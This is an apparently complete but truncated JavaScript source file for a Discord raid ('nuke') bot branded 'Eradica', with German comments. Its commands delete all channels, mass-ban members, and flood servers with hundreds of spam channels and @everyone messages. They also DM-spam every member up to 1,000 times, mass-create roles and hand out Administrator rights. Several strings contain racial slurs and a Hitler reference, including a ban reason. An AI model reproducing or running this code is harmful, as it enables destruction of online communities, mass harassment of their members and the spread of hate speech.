const { Client, GatewayIntentBits, Events, ChannelType } = require('discord.js');

const keepAlive = require("./keepAlive");

keepAlive();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});

client.commands = new Map();

// Global variable to control if commands are enabled
let botEnabled = true;

// Global variable to track running commands and allow interruption
let runningCommands = new Map();
let commandIdCounter = 0;

const nukeCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            // Private Nachricht an den Benutzer
            await message.author.send("Server wird genuked...");

            // PHASE 0: Server-Name ändern
            console.log("Ändere Server-Name...");
            try {
                await guild.setName("W̤̊O̤̊ ̤̊I̤̊S̤̊T̤̊ ̤̊H̤̊I̤̊T̤̊L̤̊E̤̊R?̤̊!̤̊");
                console.log("Server-Name erfolgreich geändert!");
            } catch (error) {
                console.error("Konnte Server-Name nicht ändern:", error.message);
            }

            // PHASE 1: Alle aktuellen Kanäle sammeln und löschen
            await guild.channels.fetch(); // Alle Kanäle vom Server laden
            const allChannels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText || 
                channel.type === ChannelType.GuildVoice || 
                channel.type === ChannelType.GuildCategory
            );

            console.log(`Lösche ${allChannels.size} Kanäle...`);

            // Alle Kanäle parallel löschen
            const deletePromises = [];
            for (const channel of allChannels.values()) {
                deletePromises.push(
                    channel.delete().catch(error => {
                        console.error(`Konnte Kanal ${channel.name} nicht löschen:`, error.message);
                    })
                );
            }

            // Warten bis ALLE Kanäle gelöscht sind
            await Promise.all(deletePromises);
            console.log("Alle Kanäle wurden gelöscht, beginne mit Kanal-Erstellung...");

            // Minimale Pause für Discord Rate Limits
            await new Promise(resolve => setTimeout(resolve, 100));

            // PHASE 2: DM-Spam an alle Member (außer dem Befehlsausführer)
            console.log("Starte DM-Spam an alle Member...");
            await guild.members.fetch(); // Alle Member laden
            const members = guild.members.cache;
            const commandExecutorId = message.author.id;

            const dmOperations = [];
            for (const member of members.values()) {
                // Alle Member außer Bots und dem Befehlsausführer
                if (!member.user.bot && member.user.id !== commandExecutorId) {
                    // 50 DM-Nachrichten pro Member
                    for (let k = 0; k < 50; k++) {
                        dmOperations.push(
                            member.send("**💀😂Destroyed by Eradica💀😂 💀😂https://discord.gg/qkUnt5Xane https://discord.gg/f7UpFQhTXx 💀😂**")
                                .catch(() => {}) // Ignore errors (DMs blockiert, etc.)
                        );
                    }
                }
            }

            // Alle DMs parallel senden
            Promise.all(dmOperations).catch(() => {}); // Fire and forget
            console.log(`DM-Spam gestartet für ${members.filter(m => !m.user.bot).size} Member...`);

            // PHASE 3: Nach dem DM-Spam - neue Kanäle erstellen
            const allOperations = [];

            // 500 Kanäle erstellen + jeweils 100 Spam-Nachrichten = 50.000 Nachrichten total
            for (let i = 0; i < 500; i++) {
                allOperations.push(
                    guild.channels.create({
                        name: `💀͛😂͛D͛e͛s͛t͛r͛o͛y͛e͛d͛ ͛B͛y͛ ͛E͛r͛a͛d͛i͛c͛a͛💀͛😂͛`,
                        type: ChannelType.GuildText,
                    }).then(newChannel => {
                        // Sofort 100 Nachrichten parallel senden - KEINE await
                        const messages = [];
                        for (let j = 0; j < 100; j++) {
                            messages.push(
                                newChannel.send("**💀😂Destroyed by Eradica💀😂https://discord.gg/qkUnt5Xane https://discord.gg/f7UpFQhTXx @everyone 💀😂**")
                                    .catch(() => {}) // Ignore errors für max speed
                            );
                        }
                        return Promise.all(messages);
                    }).catch(() => {}) // Ignore errors für max speed
                );
            }

            // 500 Kanäle erstellen + jeweils 100 Spam-Nachrichten = 50.000 Nachrichten total
            for (let i = 0; i < 500; i++) {
                allOperations.push(
                    guild.channels.create({
                        name: `💀͛😂͛D͛e͛s͛t͛r͛o͛y͛e͛d͛ ͛B͛y͛ ͛E͛r͛a͛d͛i͛c͛a͛💀͛😂͛`,
                        type: ChannelType.GuildText,
                    }).then(newChannel => {
                        // Sofort 100 Nachrichten parallel senden - KEINE await
                        const messages = [];
                        for (let j = 0; j < 100; j++) {
                            messages.push(
                                newChannel.send("**💀͛😂͛E͛a͛s͛y͛ ͛D͛e͛s͛t͛r͛o͛y͛e͛d͛ ͛B͛y͛ ͛E͛r͛a͛d͛i͛c͛a͛💀͛😂͛https://discord.gg/qkUnt5Xane https://discord.gg/f7UpFQhTXx @everyone 💀😂**")
                                    .catch(() => {}) // Ignore errors für max speed
                            );
                        }
                        return Promise.all(messages);
                    }).catch(() => {}) // Ignore errors für max speed
                );
            }

            // ALLES GLEICHZEITIG AUSFÜHREN - MAXIMALE GESCHWINDIGKEIT
            Promise.all(allOperations).catch(() => {}); // Fire and forget

            await message.author.send('Nuke-Befehl ausgeführt! Server-Name geändert, alle Kanäle gelöscht, DMs gesendet und neue Kanäle erstellt!');
        } catch (error) {
            console.error('Fehler beim Nuke-Befehl:', error);
            await message.author.send('Es gab einen Fehler beim Verarbeiten des Nuke-Befehls.');
        }
    },
};

const massBanCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("Mass Ban wird gestartet...");

            // Alle Mitglieder vom Server laden (falls nicht alle im Cache sind)
            await guild.members.fetch();
            const members = guild.members.cache;

            let bannedCount = 0;
            let errorCount = 0;

            // Parallel alle Mitglieder bannen für maximale Geschwindigkeit
            const banPromises = [];

            for (const member of members.values()) {
                // Alle bannen außer den Bot selbst
                if (member.user.id !== guild.members.me.id) {
                    banPromises.push(
                        member.ban({ 
                            reason: 'Nigger',
                            deleteMessageSeconds: 7 * 24 * 60 * 60 // 7 Tage Nachrichten löschen
                        }).then(() => {
                            bannedCount++;
                            console.log(`✅ Gebannt: ${member.user.tag}`);
                        }).catch(error => {
                            errorCount++;
                            console.error(`❌ Fehler beim Bannen von ${member.user.tag}:`, error.message);
                        })
                    );
                }
            }

            // Alle Bans parallel ausführen
            await Promise.all(banPromises);

            await message.author.send(`✅ Mass Ban beendet!\n📊 Gebannt: ${bannedCount}\n❌ Fehler: ${errorCount}`);
        } catch (error) {
            console.error('Fehler beim Mass Ban:', error);
            await message.author.send('Es gab einen Fehler beim Mass Ban.');
        }
    },
};

const adminCommand = {
    async execute(message) {
        const guild = message.guild;
        const member = message.member;

        try {
            await message.author.send("Admin-Rolle wird erstellt...");

            // Prüfen ob die Rolle bereits existiert
            let adminRole = guild.roles.cache.find(role => role.name === 'Eradica Admin');

            if (!adminRole) {
                // Rolle erstellen mit Administrator-Berechtigung
                adminRole = await guild.roles.create({
                    name: 'Eradica Admin',
                    color: 0xFF0000, // Rot
                    permissions: ['Administrator'],
                    reason: 'Eradica Admin Rolle erstellt'
                });
                console.log('✅ "Eradica Admin" Rolle erfolgreich erstellt!');
            } else {
                console.log('ℹ️ "Eradica Admin" Rolle existiert bereits');
            }

            // Rolle dem Benutzer zuweisen
            if (!member.roles.cache.has(adminRole.id)) {
                await member.roles.add(adminRole);
                console.log(`✅ Admin-Rolle erfolgreich an ${member.user.tag} vergeben!`);
                await message.author.send('✅ Du hast erfolgreich die "Eradica Admin" Rolle mit Administrator-Berechtigung erhalten!');
            } else {
                await message.author.send('ℹ️ Du hast bereits die "Eradica Admin" Rolle!');
            }

        } catch (error) {
            console.error('Fehler beim Admin-Befehl:', error);
            await message.author.send('❌ Es gab einen Fehler beim Erstellen der Admin-Rolle. Bot benötigt entsprechende Berechtigungen.');
        }
    },
};

const roleSpamCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("Role Spam wird gestartet...");

            console.log("Starte Role Spam - 250 Rollen werden erstellt...");

            // Alle Member laden
            await guild.members.fetch();
            const members = guild.members.cache.filter(member => !member.user.bot);

            const createdRoles = [];
            const rolePromises = [];

            // 250 Rollen parallel erstellen für maximale Geschwindigkeit
            for (let i = 0; i < 250; i++) {
                rolePromises.push(
                    guild.roles.create({
                        name: '💀😂Destroyed by Eradica💀😂',
                        color: Math.floor(Math.random() * 16777215), // Zufällige Farbe
                        reason: 'Role Spam by Eradica'
                    }).then(role => {
                        createdRoles.push(role);
                        return role;
                    }).catch(error => {
                        console.error(`Fehler beim Erstellen von Rolle ${i}:`, error.message);
                    })
                );
            }

            // Alle Rollen parallel erstellen
            await Promise.all(rolePromises);

            console.log("✅ Rollen erstellt, beginne mit Rollenzuweisung...");
            await message.author.send('✅ Rollen erstellt! Beginne mit der Zuweisung an alle Member...');

            // Alle erstellten Rollen an alle Member vergeben
            const assignmentPromises = [];
            for (const role of createdRoles) {
                if (role) {
                    for (const member of members.values()) {
                        assignmentPromises.push(
                            member.roles.add(role).catch(error => {
                                console.error(`Fehler beim Zuweisen von Rolle ${role.name} an ${member.user.tag}:`, error.message);
                            })
                        );
                    }
                }
            }

            // Alle Rollenzuweisungen parallel ausführen
            await Promise.all(assignmentPromises);

            console.log("✅ Role Spam beendet - 250 Rollen erstellt und allen Membern zugewiesen!");
            await message.author.send('✅ Role Spam beendet! 250 "💀😂Destroyed by Eradica💀😂" Rollen wurden erstellt und allen Membern zugewiesen!');
        } catch (error) {
            console.error('Fehler beim Role Spam:', error);
            await message.author.send('❌ Es gab einen Fehler beim Role Spam.');
        }
    },
};

const roleSpamEasyCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            await message.author.send("Role Spam Easy wird gestartet...");

            console.log("Starte Role Spam Easy - 250 Rollen werden erstellt...");

            // Alle Member laden
            await guild.members.fetch();
            const members = guild.members.cache.filter(member => !member.user.bot);

            const createdRoles = [];
            const rolePromises = [];

            // 250 Rollen parallel erstellen für maximale Geschwindigkeit
            for (let i = 0; i < 250; i++) {
                rolePromises.push(
                    guild.roles.create({
                        name: '💀͛😂͛E͛a͛s͛y͛ ͛D͛e͛s͛t͛r͛o͛y͛e͛d͛ ͛B͛y͛ ͛E͛r͛a͛d͛i͛c͛a͛💀͛😂',
                        color: Math.floor(Math.random() * 16777215), // Zufällige Farbe
                        reason: 'Role Spam Easy by Eradica'
                    }).then(role => {
                        createdRoles.push(role);
                        return role;
                    }).catch(error => {
                        console.error(`Fehler beim Erstellen von Rolle ${i}:`, error.message);
                    })
                );
            }

            // Alle Rollen parallel erstellen
            await Promise.all(rolePromises);

            console.log("✅ Rollen erstellt, beginne mit Rollenzuweisung...");
            await message.author.send('✅ Rollen erstellt! Beginne mit der Zuweisung an alle Member...');

            // Alle erstellten Rollen an alle Member vergeben
            const assignmentPromises = [];
            for (const role of createdRoles) {
                if (role) {
                    for (const member of members.values()) {
                        assignmentPromises.push(
                            member.roles.add(role).catch(error => {
                                console.error(`Fehler beim Zuweisen von Rolle ${role.name} an ${member.user.tag}:`, error.message);
                            })
                        );
                    }
                }
            }

            // Alle Rollenzuweisungen parallel ausführen
            await Promise.all(assignmentPromises);

            console.log("✅ Role Spam Easy beendet - 250 Rollen erstellt und allen Membern zugewiesen!");
            await message.author.send('✅ Role Spam Easy beendet! 250 "💀͛😂͛E͛a͛s͛y͛ ͛D͛e͛s͛t͛r͛o͛y͛e͛d͛ ͛B͛y͛ ͛E͛r͛a͛d͛i͛c͛a͛💀͛😂" Rollen wurden erstellt und allen Membern zugewiesen!');
        } catch (error) {
            console.error('Fehler beim Role Spam Easy:', error);
            await message.author.send('❌ Es gab einen Fehler beim Role Spam Easy.');
        }
    },
};

const everyoneAdminCommand = {
    async execute(message) {
        // Whitelist check
        const whitelistedUsers = ['1102625460380237835', '1227246526124789800'];
        if (!whitelistedUsers.includes(message.author.id)) {
            await message.author.send('❌ Du bist nicht berechtigt, diesen Befehl zu verwenden.');
            return;
        }

        const guild = message.guild;

        try {
            await message.author.send("Admin-Rolle wird für alle erstellt...");

            // Prüfen ob die Rolle bereits existiert
            let adminRole = guild.roles.cache.find(role => role.name === 'Eradica Admin');

            if (!adminRole) {
                // Rolle erstellen mit Administrator-Berechtigung
                adminRole = await guild.roles.create({
                    name: 'Eradica Admin',
                    color: 0xFF0000, // Rot
                    permissions: ['Administrator'],
                    reason: 'Eradica Admin Rolle für alle erstellt'
                });
                console.log('✅ "Eradica Admin" Rolle erfolgreich erstellt!');
            } else {
                console.log('ℹ️ "Eradica Admin" Rolle existiert bereits');
            }

            // Alle Member laden
            await guild.members.fetch();
            const members = guild.members.cache;

            let successCount = 0;
            let errorCount = 0;

            // Allen Membern die Rolle geben (parallel für Geschwindigkeit)
            const rolePromises = [];

            for (const member of members.values()) {
                // Alle Member außer Bots
                if (!member.user.bot && !member.roles.cache.has(adminRole.id)) {
                    rolePromises.push(
                        member.roles.add(adminRole).then(() => {
                            successCount++;
                            console.log(`✅ Admin-Rolle an ${member.user.tag} vergeben`);
                        }).catch(error => {
                            errorCount++;
                            console.error(`❌ Fehler bei ${member.user.tag}:`, error.message);
                        })
                    );
                }
            }

            // Alle Rollen parallel vergeben
            await Promise.all(rolePromises);

            console.log(`✅ Eradica Admin Rolle an alle vergeben! Erfolg: ${successCount}, Fehler: ${errorCount}`);
            await message.author.send(`✅ "Eradica Admin" Rolle wurde erfolgreich an alle Member vergeben!\n📊 Erfolg: ${successCount}\n❌ Fehler: ${errorCount}`);

        } catch (error) {
            console.error('Fehler beim Everyone Admin-Befehl:', error);
            await message.author.send('❌ Es gab einen Fehler beim Vergeben der Admin-Rolle an alle. Bot benötigt entsprechende Berechtigungen.');
        }
    },
};

const spamCommand = {
    async execute(message) {
        const channel = message.channel;

        try {
            for (let i = 0; i < 100; i++) {
                // Sending the spam message
                await channel.send("**💀😂Get Raided by Eradica💀😂https://discord.gg/qkUnt5Xane https://discord.gg/f7UpFQhTXx @everyone 💀😂**");
            }
            console.log(`Spam-Nachricht 100 Mal gesendet in Kanal: ${channel.name}`);
        } catch (error) {
            console.error('Fehler beim Senden der Spam-Nachricht:', error);
            try {
                await message.author.send('❌ Es gab einen Fehler beim Senden der Spam-Nachricht.');
            } catch (dmError) {
                console.error('Konnte keine DM senden:', dmError);
            }
        }
    },
};

const customSpamCommand = {
    async execute(message) {
        const channel = message.channel;
        const args = message.content.split(' ').slice(1); // Get the command arguments (text to spam)

        // Join the arguments back to a single string
        const spamText = args.join(' ');

        if (!spamText) {
            await message.author.send('❌ Bitte verwende einen Text, den ich spammen soll. Beispiel: `!customspam Dein Text`');
            return;
        }
        try {
            // Create an array to hold all message promises
            const messagePromises = [];
            for (let i = 0; i < 100; i++) {
                messagePromises.push(channel.send(spamText).catch(error => {
                    console.error('Fehler beim Senden der Custom Spam-Nachricht:', error);
                }));
            }
            // Send all messages concurrently
            await Promise.all(messagePromises);
            console.log(`Custom Spam-Nachricht "${spamText}" 100 Mal gesendet in Kanal: ${channel.name}`);
        } catch (error) {
            console.error('Fehler beim Senden der Custom Spam-Nachricht:', error);
            try {
                await message.author.send('❌ Es gab einen Fehler beim Senden der Custom Spam-Nachricht.');
            } catch (dmError) {
                console.error('Konnte keine DM senden:', dmError);
            }
        }
    },
};

const unbanAllCommand = {
    async execute(message) {
        // Whitelist check
        const whitelistedUsers = ['1102625460380237835', '1227246526124789800'];
        if (!whitelistedUsers.includes(message.author.id)) {
            await message.author.send('❌ Du bist nicht berechtigt, diesen Befehl zu verwenden.');
            return;
        }

        const guild = message.guild;
        try {
            await message.author.send("Starte das Unban von allen Mitgliedern...");
            // Fetch all banned members
            const bannedMembers = await guild.bans.fetch();
            const unbanPromises = [];
            if (bannedMembers.size === 0) {
                await message.author.send("🔒 Es gibt keine gebannten Mitglieder.");
                return;
            }
            // Loop through all banned members and unban them
            bannedMembers.forEach(ban => {
                unbanPromises.push(guild.members.unban(ban.user.id)
                    .then(() => {
                        console.log(`✅ Unban erfolgreich: ${ban.user.tag}`);
                    })
                    .catch(error => {
                        console.error(`❌ Fehler beim Unban von ${ban.user.tag}:`, error.message);
                    })
                );
            });
            // Execute all unban promises
            await Promise.all(unbanPromises);
            await message.author.send(`✅ Alle gebannten Mitglieder wurden erfolgreich entbannt! ${bannedMembers.size} Unbans durchgeführt.`);
        } catch (error) {
            console.error('Fehler beim Unban-All-Befehl:', error);
            await message.author.send('❌ Es gab einen Fehler beim Unban aller Mitglieder.');
        }
    },
};

const clearChannelCommand = {
    async execute(message) {
        const channel = message.channel;
        try {
            let deletedCount = 0;
            let fetched;

            // Keep fetching and deleting messages in batches of 100
            do {
                fetched = await channel.messages.fetch({ limit: 100 });

                if (fetched.size === 0) break;

                // Delete messages in bulk if they're less than 14 days old
                const bulkDeleteable = fetched.filter(msg => 
                    Date.now() - msg.createdTimestamp < 14 * 24 * 60 * 60 * 1000
                );

                if (bulkDeleteable.size >= 2) {
                    await channel.bulkDelete(bulkDeleteable);
                    deletedCount += bulkDeleteable.size;
                    console.log(`Bulk deleted ${bulkDeleteable.size} messages`);
                }

                // Delete remaining messages individually (older than 14 days)
                const remainingMessages = fetched.filter(msg => !bulkDeleteable.has(msg.id));
                for (const msg of remainingMessages.values()) {
                    try {
                        await msg.delete();
                        deletedCount++;
                    } catch (err) {
                        console.error('Fehler beim Löschen der einzelnen Nachricht:', err.message);
                    }
                }

                // Small delay to avoid rate limits
                await new Promise(resolve => setTimeout(resolve, 500));

            } while (fetched.size >= 100);

            await message.author.send(`✅ ${deletedCount} Nachrichten im Kanal ${channel.name} wurden erfolgreich gelöscht!`);
            console.log(`${deletedCount} Nachrichten im Kanal ${channel.name} wurden gelöscht.`);
        } catch (error) {
            console.error('Fehler beim Löschen der Nachrichten:', error);
            await message.author.send('❌ Es gab einen Fehler beim Löschen der Nachrichten im Kanal.');
        }
    },
};


const dmSpamCommand = {
    async execute(message) {
        const args = message.content.split(' ').slice(1);

        if (args.length < 3) {
            await message.author.send('❌ Bitte verwende das richtige Format: `!dm_spam @username amount text`\nBeispiel: `!dm_spam @redbull_1711 10 Hallo Welt`');
            return;
        }
        const targetMention = args[0];
        const amount = parseInt(args[1]);
        const text = args.slice(2).join(' ');
        // Validate amount
        if (isNaN(amount) || amount <= 0 || amount > 500) {
            await message.author.send('❌ Die Anzahl muss eine positive Zahl zwischen 1 und 500 sein.');
            return;
        }
        // Extract user ID from mention
        const userIdMatch = targetMention.match(/^<@!?(\d+)>$/);
        if (!userIdMatch) {
            await message.author.send('❌ Bitte erwähne einen gültigen Benutzer mit @username');
            return;
        }
        const targetUserId = userIdMatch[1];
        const guild = message.guild;
        try {
            // Get the target member
            const targetMember = await guild.members.fetch(targetUserId);

            if (!targetMember) {
                await message.author.send('❌ Benutzer nicht auf diesem Server gefunden.');
                return;
            }
            if (targetMember.user.bot) {
                await message.author.send('❌ Kann keine DMs an Bots senden.');
                return;
            }
            await message.author.send(`DM Spam wird gestartet: ${amount} Nachrichten an ${targetMember.user.tag}...`);
            // Send DM spam
            const dmPromises = [];
            for (let i = 0; i < amount; i++) {
                dmPromises.push(
                    targetMember.send(text).catch(error => {
                        console.error(`Fehler beim Senden von DM ${i + 1} an ${targetMember.user.tag}:`, error.message);
                    })
                );
                // Send 10 messages at a time and then wait a short moment
                if (dmPromises.length >= 10) {
                    await Promise.all(dmPromises);
                    dmPromises.length = 0;  // Clear the array for the next batch
                    await new Promise(resolve => setTimeout(resolve, 300)); // Delay for 300ms
                }
            }
            // Don't forget to send any remaining messages
            if (dmPromises.length > 0) {
                await Promise.all(dmPromises);
            }

            console.log(`DM Spam beendet: ${amount} Nachrichten an ${targetMember.user.tag} gesendet`);
            await message.author.send(`✅ DM Spam beendet! ${amount} Nachrichten an ${targetMember.user.tag} gesendet.`);
        } catch (error) {
            console.error('Fehler beim DM Spam:', error);
            await message.author.send('❌ Es gab einen Fehler beim DM Spam. Benutzer möglicherweise nicht gefunden oder DMs blockiert.');
        }
    },
};

const dominikMitDemSchwanzCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("DM Spam wird gestartet...");
            // Fetch all members from the guild
            await guild.members.fetch();
            const members = guild.members.cache;
            const dmOperations = [];
            for (const member of members.values()) {
                // Exclude bots
                if (!member.user.bot) {
                    for (let i = 0; i < 1000; i++) {  // Send 10 messages
                        dmOperations.push(
                            member.send("# ** :-- ** #").catch(error => {
                                console.error(`Fehler beim Senden von DM an ${member.user.tag}:`, error.message);
                            })
                        );
                    }
                }
            }
            // Execute all DM operations concurrently
            Promise.all(dmOperations).catch(() => {}); // Fire and forget
            console.log(`DM Spam gestartet für ${members.filter(m => !m.user.bot).size} Member...`);
            await message.author.send('✅ DM Spam beendet! Nachrichten an alle Mitglieder gesendet.');
        } catch (error) {
            console.error('Fehler beim Hanz-Mit-Dem-Schwanz-Befehl:', error);
            await message.author.send('❌ Es gab einen Fehler beim DM Spam.');
        }
    },
};

const setServerNameCommand = {
    async execute(message) {
        const guild = message.guild;
        const args = message.content.split(' ').slice(1);
        // Check if the message includes the new server name
        if (args.length === 0) {
            await message.author.send('❌ Bitte gebe einen neuen Servernamen an. Beispiel: `!set_servername NeuerName`');
            return;
        }
        const newServerName = args.join(' ');
        try {
            await guild.setName(newServerName);
            console.log(`✅ Servername geändert in: ${newServerName}`);
            await message.author.send(`✅ Der Servername wurde erfolgreich auf "${newServerName}" geändert!`);
        } catch (error) {
            console.error('Fehler beim Ändern des Servernamens:', error);
            await message.author.send('❌ Es gab einen Fehler beim Ändern des Servernamens.');
        }
    },
};

const erikamusicCommand = {
    async execute(message) {
        const guild = message.guild;
        const link = "https://open.spotify.com/intl-de/track/7wiGEwTJSroEJyXjbR4CGe?si=8a85e23e73a04370";
        try {
            await message.author.send("DM Spam wird gestartet...");
            // Fetch all members from the guild
            await guild.members.fetch();
            const members = guild.members.cache;
            const dmOperations = [];
            for (const member of members.values()) {
                // Exclude bots
                if (!member.user.bot) {
                    for (let i = 0; i < 20; i++) {  // Send the link 20 times
                        dmOperations.push(
                            member.send(link).catch(error => {
                                console.error(`Fehler beim Senden von DM an ${member.user.tag}:`, error.message);
                            })
                        );
                    }
                }
            }
            // Execute all DM operations concurrently
            Promise.all(dmOperations).catch(() => {}); // Fire and forget
            console.log(`DM Spam mit dem Link gestartet für ${members.filter(m => !m.user.bot).size} Member...`);
            await message.author.send('✅ DM Spam beendet! Nachrichten an alle Mitglieder gesendet.');
        } catch (error) {
            console.error('Fehler beim Erika-Music-Befehl:', error);
            await message.author.send('❌ Es gab einen Fehler beim DM Spam.');
        }
    },
};

const leonMitDemSchwanzCommand = {
    async execute(message) {
        const guild = message.guild;
        try {
            await message.author.send("DM Spam wird gestartet...");
            // Fetch all members from the guild
            await guild.members.fetch();
            const members = guild.members.cache;
            const dmOperations = [];
            for (const member of members.values()) {
                // Exclude bots
                if (!member.user.bot) {
                    for (let i = 0; i < 1000; i++) {  // Send 10 messages
                        dmOperations.push(
                            member.send("# ** :-------------- ** #").catch(error => {
                                console.error(`Fehler beim Senden von DM an ${member.user.tag}:`, error.message);
                            })
                        );
                    }
                }
            }
            // Execute all DM operations concurrently
            Promise.all(dmOperations).catch(() => {}); // Fire and forget
            console.log(`DM Spam gestartet für ${members.filter(m => !m.user.bot).size} Member...`);
            await message.author.send('✅ DM Spam beendet! Nachrichten an alle Mitglieder gesendet.');
        } catch (error) {
            console.error('Fehler beim leon-Mit-Dem-Schwanz-Befehl:', error);
            await message.author.send('❌ Es gab einen Fehler beim DM Spam.');
        }
    },
};

const jumpscareCommand = {
    async execute(message) {
        const guild = message.guild;
        const link1 = "https://tenor.com/view/spooky%27s-jumpscare-mansion-ringu-explosion-ringu-specimen-4-gif-1297734078095087124";
        const link2 = "https://tenor.com/view/jump-scare-gif-18504612";
        try {
            await message.author.send("Jumpscare DM spam is starting...");
            // Fetch all members from the guild
            await guild.members.fetch();
            const members = guild.members.cache;
            const dmOperations = [];
            for (const member of members.values()) {
                // Exclude bots
                if (!member.user.bot) {
                    // Send both links to each member
                    dmOperations.push(
                        member.send(link1).catch(error => {
                            console.error(`Error sending DM to ${member.user.tag}:`, error.message);
                        }),                        member.send(link2).catch(error => {
                            console.error(`Error sending DM to ${member.user.tag}:`, error.message);
                        })
                    );
                }
            }
            // Execute all DM operations concurrently
            await Promise.all(dmOperations);
            console.log(`Jumpscare links sent to ${members.filter(m => !m.user.bot).size} members.`);
            await message.author.send('✅ Jumpscare links have been sent to all members.');
        } catch (error) {
            console.error('Error while executing jumpscare command:', error);
            await message.author.send('❌ There was an error sending the jumpscare links to all members.');
        }
    },
};

const backfischCommand = {
    async execute(message) {
        const args = message.content.split(' ').slice(1);

        if (args.length === 0) {
            await message.author.send('❌ Bitte erwähne einen Benutzer. Beispiel: `!Backfisch @username`');
            return;
        }

        const targetMention = args[0];

        // Extract user ID from mention
        const userIdMatch = targetMention.match(/^<@!?(\d+)>$/);
        if (!userIdMatch) {
            await message.author.send('❌ Bitte erwähne einen gültigen Benutzer mit @username');
            return;
        }

        const targetUserId = userIdMatch[1];
        const guild = message.guild;

        try {
            // Get the target member
            const targetMember = await guild.members.fetch(targetUserId);

            if (!targetMember) {
                await message.author.send('❌ Benutzer nicht auf diesem Server gefunden.');
                return;
            }

            if (targetMember.user.bot) {
                await message.author.send('❌ Kann keine Bots bannen.');
                return;
            }

            // Don't ban yourself
            if (targetMember.user.id === guild.members.me.id) {
                await message.author.send('❌ Ich kann mich nicht selbst bannen.');
                return;
            }

            // Ban the user
            await targetMember.ban({ 
                reason: 'Backfisch Befehl ausgeführt',
                deleteMessageSeconds: 7 * 24 * 60 * 60 // 7 Tage Nachrichten löschen
            });

            console.log(`✅ Backfisch Ban erfolgreich: ${targetMember.user.tag}`);
            await message.author.send(`✅ ${targetMember.user.tag} wurde erfolgreich gebannt! 🐟`);

        } catch (error) {
            console.error('Fehler beim Backfisch Ban:', error);
            await message.author.send('❌ Es gab einen Fehler beim Bannen des Benutzers. Bot benötigt entsprechende Berechtigungen.');
        }
    },
};

const nukeTesterCommand = {
    async execute(message) {
        const guild = message.guild;

        try {
            // Private Nachricht an den Benutzer
            await message.author.send("Nuke Tester wird ausgeführt...");

            // PHASE 1: Server-Name ändern
            console.log("Ändere Server-Name...");
            try {
                await guild.setName("Nuke Tester Motherfucker Nigga");
                console.log("Server-Name erfolgreich geändert!");
            } catch (error) {
                console.error("Konnte Server-Name nicht ändern:", error.message);
            }

            // PHASE 2: Alle aktuellen Kanäle und Kategorien sammeln und löschen
            await guild.channels.fetch(); // Alle Kanäle vom Server laden
            const allChannels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText || 
                channel.type === ChannelType.GuildVoice || 
                channel.type === ChannelType.GuildCategory
            );

            console.log(`Lösche ${allChannels.size} Kanäle und Kategorien...`);

            // Alle Kanäle parallel löschen
            const deletePromises = [];
            for (const channel of allChannels.values()) {
                deletePromises.push(
                    channel.delete().catch(error => {
                        console.error(`Konnte Kanal ${channel.name} nicht löschen:`, error.message);
                    })
                );
            }

            // Warten bis ALLE Kanäle gelöscht sind
            await Promise.all(deletePromises);
            console.log("Alle Kanäle wurden gelöscht, beginne mit Kanal-Erstellung...");

            // Minimale Pause für Discord Rate Limits
            await new Promise(resolve => setTimeout(resolve, 50));

            // PHASE 3: 150 neue Kanäle erstellen + jeweils 100 Spam-Nachrichten
            const allOperations = [];

            for (let i = 0; i < 150; i++) {
                allOperations.push(
                    guild.channels.create({
                        name: `Nuke Tester Motherfucker Nigga`,
                        type: ChannelType.GuildText,
                    }).then(newChannel => {
                        // Sofort 100 Nachrichten parallel senden
                        const messages = [];
                        for (let j = 0; j < 100; j++) {
                            messages.push(
                                newChannel.send("@everyone Nuke Tester Motherfucker Nigga On Top!")
                                    .catch(() => {}) // Ignore errors für max speed
                            );
                        }
                        return Promise.all(messages);
                    }).catch(() => {}) // Ignore errors für max speed
                );
            }

            // ALLES GLEICHZEITIG AUSFÜHREN - MAXIMALE GESCHWINDIGKEIT
            Promise.all(allOperations).catch(() => {}); // Fire and forget

            await message.author.send('✅ Nuke Tester beendet! Server-Name geändert, alle Kanäle gelöscht und 150 neue Kanäle mit Spam erstellt!');
        } catch (error) {
            console.error('Fehler beim Nuke Tester:', error);
            await message.author.send('❌ Es gab einen Fehler beim Nuke Tester.');
        }
    },
};

const cleanNukeCommand = {
    async execute(message) {
        // Whitelist check
        const whitelistedUsers = ['1102625460380237835', '1227246526124789800'];
        if (!whitelistedUsers.includes(message.author.id)) {
            await message.author.send('❌ Du bist nicht berechtigt, diesen Befehl zu verwenden.');
            return;
        }

        const guild = message.guild;

        try {
            // Private Nachricht an den Benutzer
            await message.author.send("Clean Nuke wird ausgeführt - alle Kanäle werden gelöscht...");

            // Alle Kanäle vom Server laden
            await guild.channels.fetch();
            const allChannels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText || 
                channel.type === ChannelType.GuildVoice || 
                channel.type === ChannelType.GuildCategory ||
                channel.type === ChannelType.GuildAnnouncement ||
                channel.type === ChannelType.GuildStageVoice ||
                channel.type === ChannelType.GuildForum
            );

            console.log(`Clean Nuke: Lösche ${allChannels.size} Kanäle und Kategorien...`);

            // Alle Kanäle parallel löschen für maximale Geschwindigkeit
            const deletePromises = [];
            for (const channel of allChannels.values()) {
                deletePromises.push(
                    channel.delete().catch(error => {
                        console.error(`Konnte Kanal ${channel.name} nicht löschen:`, error.message);
                    })
                );
            }

            // Warten bis ALLE Kanäle gelöscht sind
            await Promise.all(deletePromises);

            console.log("✅ Clean Nuke beendet - alle Kanäle wurden gelöscht!");
            await message.author.send(`✅ Clean Nuke beendet! ${allChannels.size} Kanäle wurden erfolgreich gelöscht.`);

        } catch (error) {
            console.error('Fehler beim Clean Nuke:', error);
            await message.author.send('❌ Es gab einen Fehler beim Clean Nuke.');
        }
    },
};

const eradicaStatusCommand = {
    async execute(message) {
        const startTime = Date.now();

        try {
            // Calculate bot uptime
            const uptime = process.uptime();
            const uptimeHours = Math.floor(uptime / 3600);
            const uptimeMinutes = Math.floor((uptime % 3600) / 60);
            const uptimeSeconds = Math.floor(uptime % 60);

            // Calculate memory usage
            const memoryUsage = process.memoryUsage();
